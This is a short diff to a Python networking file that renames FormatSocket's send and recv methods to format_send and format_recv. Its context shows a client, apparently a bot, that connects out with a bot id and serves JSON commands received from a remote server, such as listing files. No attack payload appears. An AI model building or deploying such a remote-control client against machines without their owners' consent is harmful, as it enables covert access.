@@ -61,7 +61,7 @@ class FormatSocket:
         self.sock = sock
         self.lastbytes = b''
 
-    def send(self,msg):
+    def format_send(self,msg):
         '''
         Takes str or bytes and produces bytes where the first 4 bytes
         correspond to the message length
@@ -75,7 +75,7 @@ class FormatSocket:
         else:
             raise Exception("msg must be of type bytes or str")
 
-    def recv(self):
+    def format_recv(self):
         '''
         Receives bytes from recvable, expects first 4 bytes to be length of message,
         then receives that amount of data and returns raw bytes of message
@@ -310,7 +310,7 @@ class ByteLockBundler:
         dataremaining, datawritten, writedict = self.getAndClear()
         if datawritten:
             json_str = json.dumps(writedict)
-            self.fsock.send(json_str)
+            self.fsock.format_send(json_str)
         return dataremaining
 
 
@@ -377,7 +377,7 @@ def main(host=HOST, port=PORT, botid=None):
                 if sslbyte != b'\x00':
                     s = ssl.wrap_socket(s)
                 fs = FormatSocket(s)
-                fs.send(json_str)
+                fs.format_send(json_str)
                 serve(fs)
             except Exception as e:
                 sys.stderr.write("[!] "+str(e))
@@ -442,7 +442,7 @@ def serve(sock):
         fileobjs = {}
         clientobj = None
         while RUNNING:
-            recvbytes = sock.recv()
+            recvbytes = sock.format_recv()
             recvjson = json.loads(recvbytes.decode('UTF-8'))
 
             # Special LS command
